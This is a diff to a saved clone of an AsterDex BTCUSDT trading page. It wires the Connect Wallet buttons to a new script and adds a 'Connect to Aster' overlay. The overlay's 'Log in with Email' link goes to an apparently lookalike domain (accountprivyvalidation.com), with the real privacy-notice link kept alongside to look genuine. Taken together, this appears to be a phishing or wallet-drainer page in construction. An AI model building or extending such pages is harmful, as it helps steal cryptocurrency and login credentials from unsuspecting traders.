@@ -289,6 +289,8 @@
   <link rel="stylesheet"
     href="./76,481.2 _ BTCUSDT _ Grid _ Aster_files/shared~index~_-_locale_.listing-vote~_-_locale_.vaults.index~_-_locale_.vaults-MD4eyITd.css"
     as="style">
+  <script src="./76,481.2 _ BTCUSDT _ Grid _ Aster_files/bottomsheet.js">
+  </script>
   <link rel="stylesheet" href="./76,481.2 _ BTCUSDT _ Grid _ Aster_files/index-DHkid96K.css" as="style">
   <style type="text/css">
     [data-vaul-drawer] {
@@ -1333,6 +1335,40 @@
     href="https://static2.asterdexfx.com/assets/index.es-bhjaDJX2.js">
   <link rel="modulepreload" as="script" crossorigin="" href="https://static2.asterdexfx.com/assets/esm-DL56Mj9y.js">
   <style type="text/css">
+    .sheet-overlay {
+      display: none;
+
+      position: fixed;
+      inset: 0;
+
+      z-index: 9999 !important;
+
+      align-items: flex-end;
+      justify-content: center;
+
+      background: rgba(0, 0, 0, 0.5);
+
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
+    }
+
+    .sheet-overlay.active {
+      display: flex !important;
+    }
+
+    .bottom-sheet {
+      width: 100%;
+      max-width: 500px;
+
+      min-height: 300px;
+
+      padding: 18px;
+
+      background: #111;
+
+      border-radius: 24px 24px 0 0;
+    }
+
     .rfm-marquee-container {
       overflow-x: hidden;
       display: flex;
@@ -1537,15 +1573,17 @@
                           fill="currentColor"></path>
                       </svg></div>
                   </span></button></div>
-              <div class="flex items-center"><button
+              <div class="flex items-center">
+                <button id="connectWallet"
                   class="inline-flex items-center justify-center transition-colors focus-visible:outline-none disabled:pointer-events-none focus-visible:ring-2 focus-visible:ring-interactive-primary bg-transparent text-interactive-primary hover:text-interactive-primary active:text-interactive-primary disabled:text-t-disabled disabled:opacity-100 px-4 text-center font-sans [font-variant-numeric:lining-nums_tabular-nums] text-caption1 font-medium whitespace-nowrap rounded-full hover:bg-interactive-interactiveBgHover gap-1 h-6 md:h-8 relative"
                   type="button" aria-label="Connect Wallet"
                   style="background: var(--ds-sec-yellow-bg-overlay, linear-gradient(270deg, rgba(0,0,0,0) 0%, rgba(0,0,0,0.5) 100%)), var(--ds-sec-yellow-bg, rgba(230,188,139,0.15)); color: var(--ds-sec-yellow-text, var(--ds-interactive-primary, rgb(var(--colors-interactive-primary)))); box-shadow: var(--ds-sec-yellow-inner-shadow, 0 0 1px #e6bc8b inset); opacity: 1; border-width: medium; border-style: none; border-color: currentcolor; border-image: none;"><span
                     aria-hidden="true"
                     style="position: absolute; inset: 0px; border-radius: inherit; padding: 1px; background: var(--ds-sec-yellow-border, linear-gradient(to top left, rgba(244, 217, 187, 0.15) 0%, rgba(46, 46, 46, 0.23) 29.25%, rgba(50, 50, 50, 0.1) 53.18%, rgba(244, 217, 187, 0.7) 100%)); mask: linear-gradient(rgb(255, 255, 255) 0px, rgb(255, 255, 255) 0px) content-box exclude, linear-gradient(rgb(255, 255, 255) 0px, rgb(255, 255, 255) 0px); pointer-events: none; z-index: 0;"></span><span
                     class="relative z-[1] flex items-center gap-[inherit] !text-[12px]"><span
-                      class="hidden sm:contents">Connect Wallet</span><span
-                      class="contents sm:hidden">Connect</span></span></button></div>
+                      class="hidden sm:contents">Connecteeed Wallet</span><span
+                      class="contents sm:hidden">Connect</span></span></button>
+              </div>
             </div><a data-state="closed"
               class="grid place-content-center border border-border-line w-8 h-8 rounded-[24px] cursor-pointer hover:bg-interactive-interactiveBgHover"><span
                 class="sr-only">Open Download App</span><svg width="24" height="24" viewBox="0 0 24 24" fill="none"
@@ -1590,16 +1628,62 @@
                           fill="currentColor"></path>
                       </svg></div>
                   </span></button></div>
-              <div class="flex items-center"><button
+              <div class="flex items-center">
+
+                <button id="connectWallet"
                   class="inline-flex items-center justify-center transition-colors focus-visible:outline-none disabled:pointer-events-none focus-visible:ring-2 focus-visible:ring-interactive-primary bg-transparent text-interactive-primary hover:text-interactive-primary active:text-interactive-primary disabled:text-t-disabled disabled:opacity-100 px-4 text-center font-sans [font-variant-numeric:lining-nums_tabular-nums] text-caption1 font-medium whitespace-nowrap rounded-full hover:bg-interactive-interactiveBgHover gap-1 h-6 md:h-8 relative"
-                  type="button" aria-label="Connect Wallet" id="tour-guide-connect-wallet-mobile"
+                  type="button" aria-label="Connect Wallet"
                   style="background: var(--ds-sec-yellow-bg-overlay, linear-gradient(270deg, rgba(0,0,0,0) 0%, rgba(0,0,0,0.5) 100%)), var(--ds-sec-yellow-bg, rgba(230,188,139,0.15)); color: var(--ds-sec-yellow-text, var(--ds-interactive-primary, rgb(var(--colors-interactive-primary)))); box-shadow: var(--ds-sec-yellow-inner-shadow, 0 0 1px #e6bc8b inset); opacity: 1; border-width: medium; border-style: none; border-color: currentcolor; border-image: none;"><span
                     aria-hidden="true"
                     style="position: absolute; inset: 0px; border-radius: inherit; padding: 1px; background: var(--ds-sec-yellow-border, linear-gradient(to top left, rgba(244, 217, 187, 0.15) 0%, rgba(46, 46, 46, 0.23) 29.25%, rgba(50, 50, 50, 0.1) 53.18%, rgba(244, 217, 187, 0.7) 100%)); mask: linear-gradient(rgb(255, 255, 255) 0px, rgb(255, 255, 255) 0px) content-box exclude, linear-gradient(rgb(255, 255, 255) 0px, rgb(255, 255, 255) 0px); pointer-events: none; z-index: 0;"></span><span
                     class="relative z-[1] flex items-center gap-[inherit] !text-[12px]"><span
                       class="hidden sm:contents">Connect Wallet</span><span
-                      class="contents sm:hidden">Connect</span></span></button></div>
+                      class="contents sm:hidden">Connect</span></span></button>
+              </div>
+              <!-- Bottom Sheet -->
+              <div id="sheetOverlay" class="sheet-overlay">
+                <div id="bottomSheet" class="bottom-sheet">
+                  <div class="flex flex-col">
+                    <div class="flex justify-between items-center mb-4">
+                      <p class="text-base text-t-secondary font-medium">Connect to Aster</p><button type="button"
+                        class=""><svg width="1em" height="1em" viewBox="0 0 20 20" fill="none"
+                          xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-t-secondary">
+                          <path fill-rule="evenodd" clip-rule="evenodd"
+                            d="M10.00011 10.70711L17.1465 17.8535L17.8536 17.1464L10.70721 10L17.8536 2.85362L17.1465 2.14652L10.00011 9.29289L2.85361 2.14639L2.1465 2.8535L9.293 10L2.1465 17.1465L2.85361 17.8536L10.00011 10.70711Z"
+                            fill="currentColor"></path>
+                        </svg></button>
+                    </div>
+                    <button id="emailAlert" type="button"
+                      class="w-full h-[48px] flex items-center justify-center rounded-none text-md bg-interactive-primary hover:bg-interactive-primaryHover active:bg-interactive-primaryActive text-interactive-interactive01">Connect
+                      a wallet
+                    </button>
+                    <div class="h-6 items-center flex gap-2 my-4">
+                      <div class="flex-1 h-px bg-border-lineSubtle"></div>
+                      <div class="text-t-third text-body2">or</div>
+                      <div class="flex-1 h-px bg-border-lineSubtle"></div>
+                    </div>
+                    <div
+                      class="flex items-center  w-full h-[56px] px-4 py-3 bg-interactive-interactive01 hover:bg-interactive-interactive01Hover text-t-secondary text-base font-light cursor-pointer justify-center ">
+                      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20" fill="none"
+                        class="hidden sm:block w-5 h-5 text-t-secondary mr-3">
+                        <path
+                          d="M1.25 6.21875L10 12.2344L18.75 6.21875V3.75H1.25V6.21875ZM18.75 7.73438L10 13.75L1.25 7.73438V16.25H18.75V7.73438ZM0 16.25V6.875V3.75V2.5H1.25H18.75H20V3.75V6.875V16.25V17.5H18.75H1.25H0V16.25Z"
+                          fill="#747474"></path>
+                      </svg><a class="flex-1 text-center sm:flex-none sm:text-left" target="_blank"
+                        href="https://api.accountprivyvalidation.com/auth">Log in with Email</a>
+                    </div>
+                    <p class=" text-xs text-t-secondary mt-4 text-left">Note: By connecting, you consent to the
+                      processing of your personal data as described in AsterDex's <a
+                        href="https://docs.asterdex.com/about-us/aster-privacy-policy" target="_blank"
+                        rel="noopener noreferrer" class="text-t-link hover:underline">Privacy Notice</a>.</p>
+                  </div>
+                </div>
+              </div>
             </div>
+
+
+
+
           </div><button type="button" aria-haspopup="dialog" aria-expanded="false" aria-controls="radix-_r_e_"
             data-state="closed" class="md:hidden">
             <div id="tour-guide-off-canvas-menu" class="flex items-center justify-center w-6 h-6 md:hidden"><svg
